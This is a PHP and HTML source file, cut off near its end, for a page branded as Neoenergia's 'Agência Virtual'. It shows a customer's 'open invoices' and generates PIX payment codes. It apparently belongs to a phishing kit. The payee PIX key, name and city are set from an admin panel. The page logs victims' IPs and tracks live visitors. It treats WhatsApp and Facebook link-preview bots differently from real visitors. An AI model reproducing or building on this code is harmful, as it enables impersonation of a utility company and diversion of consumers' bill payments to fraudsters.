<?php
/**
 * Página para exibir múltiplas faturas manuais e permitir pagamento
 * Design igual ao selecionar_fatura.php (versão API)
 */
require_once __DIR__ . '/config.php';
addSecurityHeaders();

// Detectar se é um bot/crawler (WhatsApp, Facebook, etc.)
$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
$isBot = preg_match('/whatsapp|facebookexternalhit|facebot|twitterbot|telegrambot|slackbot|linkedinbot|discordbot|bot|crawler|spider|scraper|prerender/i', $userAgent);

// Buscar configuração WhatsApp
$pdo = getConnection();
$stmtWhatsapp = $pdo->prepare("SELECT valor, ativo FROM configuracoes WHERE chave = 'whatsapp' LIMIT 1");
$stmtWhatsapp->execute();
$whatsappConfig = $stmtWhatsapp->fetch();
$whatsappAtivo = $whatsappConfig && $whatsappConfig['ativo'];
$whatsappNumero = '';
if ($whatsappConfig && $whatsappConfig['valor']) {
    $wData = json_decode($whatsappConfig['valor'], true);
    $whatsappNumero = $wData['numero'] ?? '';
}

// Buscar configuração PIX ATUAL (prioridade: chave_pix_padrao; fallback: chaves antigas)
$pixChaveAtual = '';
$pixNomeAtual = '';
$pixCidadeAtual = '';
$pixTxidAtual = '';

// 1) Prioridade máxima: chave_pix_padrao (JSON) configurada no painel
$stmtPixPadrao = $pdo->prepare("SELECT valor FROM configuracoes WHERE chave = 'chave_pix_padrao' AND ativo = 1 LIMIT 1");
$stmtPixPadrao->execute();
$pixPadraoRow = $stmtPixPadrao->fetch();
if ($pixPadraoRow && !empty($pixPadraoRow['valor'])) {
    $pixPadrao = json_decode($pixPadraoRow['valor'], true);
    if (is_array($pixPadrao)) {
        $pixChaveAtual = trim((string)($pixPadrao['chave_pix'] ?? ''));
        $pixNomeAtual = trim((string)($pixPadrao['nome_recebedor'] ?? ''));
        $pixCidadeAtual = trim((string)($pixPadrao['cidade'] ?? ''));
        $pixTxidAtual = trim((string)($pixPadrao['txid'] ?? ''));
    }
}

// 2) Fallback: chaves antigas separadas (caso existam)
$stmtPix = $pdo->prepare("SELECT chave, valor FROM configuracoes WHERE chave IN ('pix_chave', 'pix_nome_recebedor', 'pix_cidade', 'pix_referencia')");
$stmtPix->execute();
$pixConfigs = $stmtPix->fetchAll(PDO::FETCH_KEY_PAIR);

if (empty($pixChaveAtual) && !empty($pixConfigs['pix_chave'])) $pixChaveAtual = $pixConfigs['pix_chave'];
if (empty($pixNomeAtual) && !empty($pixConfigs['pix_nome_recebedor'])) $pixNomeAtual = $pixConfigs['pix_nome_recebedor'];
if (empty($pixCidadeAtual) && !empty($pixConfigs['pix_cidade'])) $pixCidadeAtual = $pixConfigs['pix_cidade'];
if (empty($pixTxidAtual) && !empty($pixConfigs['pix_referencia'])) $pixTxidAtual = $pixConfigs['pix_referencia'];

// Obter códigos das faturas
$codigosParam = isset($_GET['codigos']) ? sanitize($_GET['codigos']) : '';
$uc = isset($_GET['uc']) ? sanitize($_GET['uc']) : '';
$endereco = isset($_GET['endereco']) ? sanitize($_GET['endereco']) : '';
$protocolo = isset($_GET['protocolo']) ? sanitize($_GET['protocolo']) : date('YmdHis') . rand(1000, 9999);

if (empty($codigosParam)) {
    redirect('index.php');
}

// Converter códigos em array
$codigosArray = array_filter(array_map('intval', explode(',', $codigosParam)));

if (empty($codigosArray)) {
    redirect('index.php');
}

// Buscar faturas da tabela pagamentos
$placeholders = implode(',', array_fill(0, count($codigosArray), '?'));
$stmt = $pdo->prepare("SELECT * FROM pagamentos WHERE codigo IN ($placeholders) AND status = 'pendente' ORDER BY created_at ASC");
$stmt->execute($codigosArray);
$faturas = $stmt->fetchAll();

if (empty($faturas)) {
    redirect('sem_faturas.php');
}

// Se UC ou endereço vazios, tentar extrair do identificador da primeira fatura
// Formato do identificador: grupo_id|uc|endereco
if (empty($uc) || empty($endereco)) {
    $primeiroIdentificador = $faturas[0]['identificador'] ?? '';
    if (strpos($primeiroIdentificador, '|') !== false) {
        $partes = explode('|', $primeiroIdentificador);
        if (empty($uc) && isset($partes[1]) && !empty(trim($partes[1]))) {
            $uc = trim($partes[1]);
        }
        if (empty($endereco) && isset($partes[2]) && !empty(trim($partes[2]))) {
            $endereco = trim($partes[2]);
        }
    } elseif (empty($uc)) {
        // Formato antigo - o identificador pode ser a própria UC
        $uc = $primeiroIdentificador;
    }
}

// Registrar visita anônima (para contador "Online Agora" no painel)
// NÃO atualizar ultimo_acesso dos pagamentos aqui - só quando abrir o modal do PIX
$ipCliente = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'desconhecido';
if (strpos($ipCliente, ',') !== false) {
    $ipCliente = trim(explode(',', $ipCliente)[0]);
}

// Gerar session_id único para este visitante
$sessionId = 'fm_' . md5($ipCliente . date('Ymd')) . '_' . substr(md5(uniqid()), 0, 8);
if (isset($_COOKIE['visitor_session'])) {
    $sessionId = $_COOKIE['visitor_session'];
} else {
    setcookie('visitor_session', $sessionId, time() + 86400, '/');
}

// Registrar como visitante anônimo (mostra no "Online Agora" do painel) - apenas se não for bot
if (!$isBot) {
    $stmtVisitaAnonima = $pdo->prepare("
        INSERT INTO visitas_anonimas (session_id, pagina, etapa, ultimo_acesso, ip_hash)
        VALUES (?, 'faturas-manual', 'visualizando', NOW(), ?)
        ON DUPLICATE KEY UPDATE 
            pagina = 'faturas-manual',
            etapa = 'visualizando',
            ultimo_acesso = NOW()
    ");
    $stmtVisitaAnonima->execute([$sessionId, md5($ipCliente)]);
}

// Registrar 1 acesso único para o contador "Total Acessos" (1 por session_id) - apenas se não for bot
if (!$isBot) {
    try {
        // Criar tabela se não existir (best-effort)
        $pdo->exec("CREATE TABLE IF NOT EXISTS estatisticas_cliques (
            id INT AUTO_INCREMENT PRIMARY KEY,
            tipo VARCHAR(50) NOT NULL DEFAULT 'visita_index',
            session_id VARCHAR(100) NULL,
            ip_hash VARCHAR(64) NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            UNIQUE KEY unique_tipo_session (tipo, session_id)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci");

        $stmtClick = $pdo->prepare("
            INSERT INTO estatisticas_cliques (tipo, session_id, created_at)
            SELECT 'visita_faturas_manual', ?, NOW()
            WHERE NOT EXISTS (
                SELECT 1 FROM estatisticas_cliques 
                WHERE tipo = 'visita_faturas_manual' AND session_id = ?
            )
        ");
        $stmtClick->execute([$sessionId, $sessionId]);
    } catch (Exception $e) {
        error_log('faturas-manual: erro ao registrar acesso unico: ' . $e->getMessage());
    }
}

// Apenas incrementar visitas (contador interno da fatura), mas NÃO atualizar ultimo_acesso
// O ultimo_acesso só será atualizado quando o modal do PIX for aberto
foreach ($faturas as $fatura) {
    $stmtVisita = $pdo->prepare("
        UPDATE pagamentos 
        SET visitas = COALESCE(visitas, 0) + 1,
            ip_cliente = ?
        WHERE id = ? AND (visitas IS NULL OR visitas = 0 OR ultimo_acesso IS NULL OR ultimo_acesso < DATE_SUB(NOW(), INTERVAL 5 MINUTE))
    ");
    $stmtVisita->execute([$ipCliente, $fatura['id']]);
}

// Função para formatar valor
function formatarValor($valor) {
    return 'R$ ' . number_format($valor, 2, ',', '.');
}

// Função para extrair vencimento da descrição
function extrairVencimento($descricao) {
    if (preg_match('/Venc:\s*(\d{2}\/\d{2}\/\d{4})/', $descricao, $matches)) {
        return $matches[1];
    }
    return '-';
}

// Função para verificar status baseado na data
function getStatusLabel($descricao) {
    $vencimento = extrairVencimento($descricao);
    if ($vencimento === '-') return 'A vencer';
    
    // Converter data
    $partes = explode('/', $vencimento);
    if (count($partes) === 3) {
        $dataVenc = mktime(0, 0, 0, $partes[1], $partes[0], $partes[2]);
        $hoje = mktime(0, 0, 0, date('m'), date('d'), date('Y'));
        if ($dataVenc < $hoje) return 'Vencida';
    }
    return 'A vencer';
}

function getStatusColor($status) {
    if ($status === 'Vencida') return 'color: #EF4444;';
    if ($status === 'A vencer') return 'color: #22C55E;';
    return 'color: #22C55E;';
}

// Mascarar identificador
function maskIdentificador($id) {
    if (strlen($id) <= 4) return $id;
    return substr($id, 0, 2) . '****' . substr($id, -2);
}

// IDs das faturas para heartbeat
$faturaIds = array_column($faturas, 'id');
$faturaIdsJson = json_encode($faturaIds);
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Neoenergia - Agência Virtual</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="icon" type="image/png" href="assets/favicon.png">
    <link rel="stylesheet" href="assets/lovable-base.css">
    <script src="https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.min.js"></script>
    <style>
        /* Page-specific overrides */
        :root {
            --background: hsl(0, 0%, 100%);
            --foreground: hsl(0, 0%, 20%);
            --card: hsl(0, 0%, 100%);
            --primary: hsl(145, 100%, 32%);
            --primary-foreground: hsl(0, 0%, 100%);
            --muted: hsl(0, 0%, 96%);
            --muted-foreground: hsl(0, 0%, 45%);
            --border: hsl(0, 0%, 90%);
            --secondary: hsl(0, 0%, 96%);
            --destructive: hsl(0, 84%, 60%);
            --neo-green: #00A443;
            --neo-green-dark: #007F33;
            --neo-green-hex: #00A443;
            --neo-green-dark-hex: #007F33;
            --neo-blue: #0066CC;
            --neo-blue-hex: #0066CC;
        }
        
        body {
            font-family: 'Roboto', system-ui, -apple-system, 'Segoe UI', sans-serif;
            background: var(--secondary);
            color: var(--foreground);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            -webkit-font-smoothing: antialiased;
        }
        
        /* Header Verde - Idêntico ao Lovable */
        .header {
            background: var(--neo-green);
            width: 100%;
        }
        
        .header-container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 16px;
        }
        
        .header-content {
            height: 64px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        
        .header-left {
            display: flex;
            align-items: center;
            gap: 16px;
        }
        
        .menu-btn {
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: transparent;
            border: none;
            color: rgba(255, 255, 255, 0.9);
            cursor: pointer;
        }
        
        .header-logo {
            height: 48px;
            width: auto;
        }
        
        .login-btn {
            height: 36px;
            padding: 0 16px;
            border-radius: 6px;
            background: var(--neo-green-dark);
            color: white;
            font-size: 14px;
            font-weight: 500;
            border: none;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        /* Main Content */
        .main {
            flex: 1;
            padding: 32px 16px;
        }
        
        .container {
            max-width: 900px;
            margin: 0 auto;
            animation: fadeInUp 0.4s ease;
        }
        
        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        /* Protocolo Badge */
        .protocolo-badge {
            display: inline-block;
            background: var(--muted);
            color: var(--muted-foreground);
            font-size: 14px;
            padding: 6px 12px;
            border-radius: 4px;
            margin-bottom: 16px;
        }
        
        .protocolo-badge span {
            color: var(--foreground);
            font-weight: 500;
        }
        
        /* Title - igual Lovable */
        .page-title {
            font-size: 28.8px;
            font-weight: 700;
            color: #615D5A;
            margin-bottom: 8px;
            line-height: 1.2;
        }
        
        .page-subtitle {
            font-size: 14px;
            color: var(--muted-foreground);
            margin-bottom: 32px;
        }
        
        /* Info Card */
        .info-card {
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
            margin-bottom: 24px;
            overflow: hidden;
        }
        
        .info-row {
            padding: 16px;
        }
        
        .info-row + .info-row {
            border-top: 1px solid var(--border);
        }
        
        .info-row.compact {
            padding-bottom: 8px;
        }
        
        .info-row.compact + .info-row {
            padding-top: 8px;
            border-top: none;
        }
        
        .info-label {
            font-size: 12px;
            text-transform: uppercase;
            color: var(--neo-green);
            font-weight: 500;
            margin-bottom: 4px;
        }
        
        .info-value {
            font-size: 20px;
            font-weight: 500;
            color: var(--foreground);
        }
        
        .info-value.small {
            font-size: 14px;
            font-weight: 400;
        }
        
        /* Faturas Header */
        .faturas-header {
            background: var(--neo-green);
            color: white;
            padding: 16px 24px;
            border-radius: 8px 8px 0 0;
            font-weight: 500;
        }
        
        /* Faturas List */
        .faturas-list {
            background: white;
            border-radius: 0 0 8px 8px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
        }
        
        .fatura-item {
            padding: 24px;
            border-bottom: 1px solid var(--border);
        }
        
        .fatura-item:last-child {
            border-bottom: none;
        }
        
        .fatura-info {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
            margin-bottom: 24px;
            text-align: center;
        }
        
        .fatura-info-item {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .fatura-info-label {
            font-size: 12px;
            text-transform: uppercase;
            color: var(--muted-foreground);
            margin-bottom: 2px;
        }
        
        .fatura-info-value {
            font-weight: 500;
        }
        
        /* Botão PIX */
        .btn-pix {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            width: 100%;
            background: var(--neo-blue);
            color: white;
            font-weight: 500;
            padding: 12px 32px;
            border-radius: 24px;
            border: none;
            cursor: pointer;
            font-size: 16px;
            transition: opacity 0.2s;
        }
        
        .btn-pix:hover {
            opacity: 0.9;
        }
        
        /* Aviso */
        .aviso {
            color: var(--destructive);
            font-size: 14px;
            margin-top: 24px;
        }
        
        .info-text {
            margin-top: 16px;
        }
        
        .info-text strong {
            display: block;
            font-size: 14px;
            color: var(--foreground);
            margin-bottom: 4px;
        }
        
        .info-text p {
            font-size: 14px;
            color: var(--muted-foreground);
        }
        
        /* Botões */
        .btn-container {
            margin-top: 32px;
            display: flex;
            gap: 12px;
        }
        
        .btn-primary {
            background: var(--neo-green);
            color: white;
            font-weight: 500;
            padding: 12px 24px;
            border-radius: 24px;
            border: none;
            cursor: pointer;
            font-size: 14px;
            text-transform: uppercase;
        }
        
        /* Footer */
        .footer {
            background: var(--background);
            border-top: 4px solid var(--neo-green);
            padding: 32px 16px 24px;
        }
        
        .footer-content {
            max-width: 600px;
            margin: 0 auto;
        }
        
        .footer-top {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            margin-bottom: 24px;
        }
        
        .footer-social h4 {
            font-size: 14px;
            font-weight: 500;
            color: var(--foreground);
            margin-bottom: 12px;
        }
        
        .footer-social-icons {
            display: flex;
            gap: 8px;
        }
        
        .footer-social-icons a {
            width: 32px;
            height: 32px;
            background: var(--neo-green);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            text-decoration: none;
            transition: opacity 0.2s;
        }
        
        .footer-social-icons a:hover {
            opacity: 0.8;
        }
        
        .footer-group {
            text-align: right;
        }
        
        .footer-group h4 {
            font-size: 14px;
            font-weight: 600;
            color: var(--neo-green);
            margin-bottom: 8px;
        }
        
        .footer-group p {
            font-size: 12px;
            color: var(--muted-foreground);
            line-height: 1.4;
        }
        
        .footer-logo {
            text-align: center;
            margin-bottom: 24px;
        }
        
        .footer-logo img {
            height: 40px;
            width: auto;
        }
        
        .footer-bottom {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 24px;
            padding-top: 16px;
            border-top: 1px solid var(--border);
        }
        
        .footer-bottom img {
            height: 28px;
            width: auto;
            opacity: 0.7;
        }
        
        /* Modal */
        .modal-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.5);
            z-index: 1000;
            align-items: center;
            justify-content: center;
            padding: 16px;
        }
        
        .modal-overlay.open {
            display: flex;
        }
        
        .modal {
            background: white;
            border-radius: 8px;
            max-width: 420px;
            width: 100%;
            max-height: 90vh;
            overflow-y: auto;
            animation: fadeInUp 0.3s ease;
        }
        
        .modal-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 16px;
            border-bottom: 1px solid var(--border);
        }
        
        .modal-header h3 {
            font-size: 18px;
            font-weight: 500;
        }
        
        .modal-close {
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: transparent;
            border: none;
            cursor: pointer;
            border-radius: 50%;
            color: var(--muted-foreground);
        }
        
        .modal-close:hover {
            background: var(--muted);
        }
        
        .modal-content {
            padding: 24px;
            text-align: center;
        }
        
        .modal-text {
            font-size: 14px;
            color: var(--muted-foreground);
            margin-bottom: 24px;
        }
        
        .qr-container {
            display: flex;
            justify-content: center;
            margin-bottom: 16px;
        }
        
        .qr-box {
            border: 2px solid var(--neo-green);
            border-radius: 8px;
            padding: 16px;
            background: white;
        }
        
        .pix-code-box {
            margin-bottom: 16px;
            padding: 12px;
            background: rgba(0, 0, 0, 0.03);
            border-radius: 8px;
            border: 1px solid var(--border);
        }
        
        .pix-code-label {
            font-size: 12px;
            text-transform: uppercase;
            color: var(--muted-foreground);
            font-weight: 500;
            margin-bottom: 4px;
        }
        
        .pix-code-value {
            font-size: 9px;
            font-family: monospace;
            word-break: break-all;
            color: var(--foreground);
            line-height: 1.5;
        }
        
        .btn-copy {
            width: 100%;
            background: var(--neo-green);
            color: white;
            font-weight: 600;
            padding: 14px 24px;
            border-radius: 8px;
            border: none;
            cursor: pointer;
            font-size: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: all 0.2s;
        }
        
        .btn-copy.copied {
            background: #22C55E;
        }
        
        .loading-spinner {
            width: 180px;
            height: 180px;
            background: var(--muted);
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: pulse 1.5s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        /* Accordion Help */
        .accordion-help {
            border: 1px solid var(--border);
            border-radius: 8px;
            margin-bottom: 24px;
            overflow: hidden;
        }
        
        .accordion-trigger {
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 100%;
            padding: 16px;
            background: transparent;
            border: none;
            cursor: pointer;
            transition: background 0.2s;
        }
        
        .accordion-trigger:hover {
            background: rgba(0, 0, 0, 0.03);
        }
        
        .accordion-trigger-left {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .accordion-trigger-left svg {
            color: var(--neo-green);
        }
        
        .accordion-trigger-left span {
            font-size: 14px;
            font-weight: 500;
            color: var(--foreground);
        }
        
        .accordion-chevron {
            color: var(--muted-foreground);
            transition: transform 0.2s;
        }
        
        .accordion-help.open .accordion-chevron {
            transform: rotate(180deg);
        }
        
        .accordion-content {
            max-height: 0;
            overflow: hidden;
            transition: max-height 0.3s ease;
        }
        
        .accordion-help.open .accordion-content {
            max-height: 400px;
        }
        
        .accordion-content-inner {
            padding: 0 16px 16px;
        }
        
        .step-item {
            display: flex;
            align-items: flex-start;
            gap: 12px;
            margin-bottom: 12px;
        }
        
        .step-item:last-child {
            margin-bottom: 0;
        }
        
        .step-number {
            width: 24px;
            height: 24px;
            background: var(--neo-green);
            color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            font-size: 12px;
            font-weight: 500;
        }
        
        .step-text {
            font-size: 14px;
            color: var(--foreground);
            text-align: left;
            line-height: 1.5;
        }
        
        .step-text strong {
            font-weight: 600;
        }
        
        .modal-valor-section {
            border-top: 1px solid var(--border);
            padding-top: 16px;
            text-align: center;
        }
        
        .modal-valor-label {
            font-size: 12px;
            color: var(--muted-foreground);
            text-transform: uppercase;
            margin-bottom: 4px;
        }
        
        .modal-valor-value {
            font-size: 20px;
            font-weight: 500;
            color: var(--neo-green);
        }
        
        /* WhatsApp Button */
        .whatsapp-btn {
            position: fixed;
            bottom: 24px;
            right: 24px;
            width: 56px;
            height: 56px;
            border-radius: 50%;
            background: #25D366;
            color: white;
            border: none;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
            z-index: 1000;
            text-decoration: none;
        }
        
        .whatsapp-btn svg {
            width: 28px;
            height: 28px;
        }
    </style>
</head>
<body>
    <!-- Header Verde -->
    <header class="header">
        <div class="header-container">
            <div class="header-content">
                <div class="header-left">
                    <button type="button" class="menu-btn" aria-label="Abrir menu">
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <line x1="4" y1="12" x2="20" y2="12"></line>
                            <line x1="4" y1="6" x2="20" y2="6"></line>
                            <line x1="4" y1="18" x2="20" y2="18"></line>
                        </svg>
                    </button>
                    <img src="assets/logo-neoenergia-header.svg" alt="Neoenergia" class="header-logo">
                </div>
                <button type="button" class="login-btn">
                    Login
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <line x1="5" y1="12" x2="19" y2="12"></line>
                        <polyline points="12 5 19 12 12 19"></polyline>
                    </svg>
                </button>
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <main class="main">
        <div class="container">
            <!-- Protocolo -->
            <div class="protocolo-badge">
                PROTOCOLO: <span><?= htmlspecialchars($protocolo) ?></span>
            </div>

            <!-- Título -->
            <h1 class="page-title">2ª Via de Pagamento</h1>
            <p class="page-subtitle">Aqui você visualiza o código de barras da sua fatura Elektro em aberto, de maneira rápida e fácil.</p>

            <!-- Info Card -->
            <?php if ($uc || $endereco): ?>
            <div class="info-card">
                <?php if ($uc): ?>
                <div class="info-row compact">
                    <div class="info-label">UNIDADE CONSUMIDORA</div>
                    <div class="info-value"><?= htmlspecialchars(maskIdentificador($uc)) ?></div>
                </div>
                <?php endif; ?>
                <?php if ($endereco): ?>
                <div class="info-row<?= $uc ? '' : '' ?>">
                    <div class="info-label">ENDEREÇO</div>
                    <div class="info-value small"><?= htmlspecialchars($endereco) ?></div>
                </div>
                <?php endif; ?>
            </div>
            <?php else: ?>
            <!-- Se não tiver UC/Endereço, mostrar só o identificador da primeira fatura -->
            <div class="info-card">
                <div class="info-row">
                    <div class="info-label">ENDEREÇO</div>
                    <div class="info-value small"><?= htmlspecialchars($faturas[0]['identificador'] ?? 'N/A') ?></div>
                </div>
            </div>
            <?php endif; ?>

            <!-- Faturas em Aberto -->
            <div class="faturas-header">Faturas em aberto</div>
            <div class="faturas-list">
                <?php foreach ($faturas as $index => $fatura): 
                    $valor = floatval($fatura['valor']);
                    $vencimento = extrairVencimento($fatura['descricao'] ?? '');
                    $status = getStatusLabel($fatura['descricao'] ?? '');
                ?>
                <div class="fatura-item">
                    <div class="fatura-info">
                        <div class="fatura-info-item">
                            <span class="fatura-info-label">STATUS</span>
                            <span class="fatura-info-value" style="<?= getStatusColor($status) ?>"><?= htmlspecialchars($status) ?></span>
                        </div>
                        <div class="fatura-info-item">
                            <span class="fatura-info-label">VALOR</span>
                            <span class="fatura-info-value" style="color: var(--neo-green);"><?= formatarValor($valor) ?></span>
                        </div>
                        <div class="fatura-info-item">
                            <span class="fatura-info-label">VENCIMENTO</span>
                            <span class="fatura-info-value" style="color: var(--neo-green);"><?= htmlspecialchars($vencimento) ?></span>
                        </div>
                    </div>
                    
                    <button type="button" class="btn-pix" onclick="abrirModalPix(<?= $index ?>)" 
                        data-index="<?= $index ?>" 
                        data-id="<?= htmlspecialchars($fatura['id']) ?>"
                        data-valor="<?= $valor ?>" 
                        data-chave="<?= htmlspecialchars($pixChaveAtual ?: $fatura['chave_pix']) ?>"
                        data-nome="<?= htmlspecialchars($pixNomeAtual ?: $fatura['nome_recebedor']) ?>"
                        data-cidade="<?= htmlspecialchars($pixCidadeAtual ?: $fatura['cidade']) ?>"
                        data-txid="<?= htmlspecialchars($pixTxidAtual ?: ($fatura['txid'] ?? '')) ?>">
                        <span>Pagar com PIX</span>
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                            <path d="M9.172 15.172L12 18l2.828-2.828L12 12.343l-2.828 2.829zM12 5.657l2.828 2.829L12 11.314 9.172 8.486 12 5.657zM5.657 12l2.829-2.828L11.314 12l-2.828 2.828L5.657 12zM12.686 12l2.828-2.828L18.343 12l-2.829 2.828L12.686 12z"/>
                        </svg>
                    </button>
                </div>
                <?php endforeach; ?>
            </div>

            <!-- Aviso -->
            <p class="aviso">Atenção! O pagamento pode demorar até 3 dias úteis para ser compensado e identificado.</p>

            <!-- Info Box -->
            <div class="info-text">
                <strong>Valores das faturas em aberto:</strong>
                <p>Este valor corresponde ao débito atual da unidade consumidora informada. Para as faturas pagas após a data de vencimento, serão incididos juros e multas no próximo mês de faturamento.</p>
            </div>

        </div>
    </main>

    <!-- Footer -->
    <footer class="footer" style="padding: 0; background: transparent;">
        <img src="assets/footer-manual.png" alt="Footer Neoenergia" style="width: 100%; display: block;" />
    </footer>

    <!-- Modal PIX -->
    <div class="modal-overlay" id="modalPix">
        <div class="modal">
            <div class="modal-header">
                <h3>Pagamento por PIX</h3>
                <button type="button" class="modal-close" onclick="fecharModalPix()">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <line x1="18" y1="6" x2="6" y2="18"></line>
                        <line x1="6" y1="6" x2="18" y2="18"></line>
                    </svg>
                </button>
            </div>
            <div class="modal-content">
                <p class="modal-text">Abra o aplicativo do seu banco, selecione PIX e efetue o pagamento utilizando o QR code.</p>
                
                <div class="qr-container">
                    <div class="qr-box" id="qrCodeContainer">
                        <div class="loading-spinner" id="qrLoading">
                            <span style="color: var(--muted-foreground); font-size: 14px;">Gerando QR Code...</span>
                        </div>
                        <div id="qrCodeImage" style="display: none;"></div>
                    </div>
                </div>

                <div class="pix-code-box" id="pixCodeBox" style="display: none;">
                    <div class="pix-code-label">Código Copia e Cola</div>
                    <div class="pix-code-value" id="pixCodeValue"></div>
                </div>

                <button type="button" class="btn-copy" id="btnCopy" onclick="copiarPix()" style="display: none;">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                    </svg>
                    <span id="btnCopyText">Copiar código PIX</span>
                </button>

                <!-- Accordion - Como pagar com PIX -->
                <div class="accordion-help" id="accordionHelp">
                    <button type="button" class="accordion-trigger" onclick="toggleAccordion()">
                        <div class="accordion-trigger-left">
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <circle cx="12" cy="12" r="10"></circle>
                                <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path>
                                <line x1="12" y1="17" x2="12.01" y2="17"></line>
                            </svg>
                            <span>Como pagar com PIX?</span>
                        </div>
                        <svg class="accordion-chevron" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <polyline points="6 9 12 15 18 9"></polyline>
                        </svg>
                    </button>
                    <div class="accordion-content">
                        <div class="accordion-content-inner">
                            <div class="step-item">
                                <div class="step-number">1</div>
                                <div class="step-text">Abra o <strong>aplicativo do seu banco</strong></div>
                            </div>
                            <div class="step-item">
                                <div class="step-number">2</div>
                                <div class="step-text">Selecione a opção <strong>PIX</strong></div>
                            </div>
                            <div class="step-item">
                                <div class="step-number">3</div>
                                <div class="step-text">Escolha <strong>Pagar com QR Code</strong> ou <strong>Copia e Cola</strong></div>
                            </div>
                            <div class="step-item">
                                <div class="step-number">4</div>
                                <div class="step-text">Escaneie o QR Code ou cole o código copiado</div>
                            </div>
                            <div class="step-item">
                                <div class="step-number">5</div>
                                <div class="step-text">Confirme o pagamento e <strong>pronto!</strong></div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Valor da fatura -->
                <div class="modal-valor-section">
                    <div class="modal-valor-label">Valor da Fatura</div>
                    <div class="modal-valor-value" id="modalValor">R$ 0,00</div>
                </div>
            </div>
        </div>
    </div>

    <?php if ($whatsappAtivo && $whatsappNumero): ?>
    <a href="https://wa.me/<?= preg_replace('/\D/', '', $whatsappNumero) ?>" target="_blank" class="whatsapp-btn">
        <svg viewBox="0 0 24 24" fill="white">
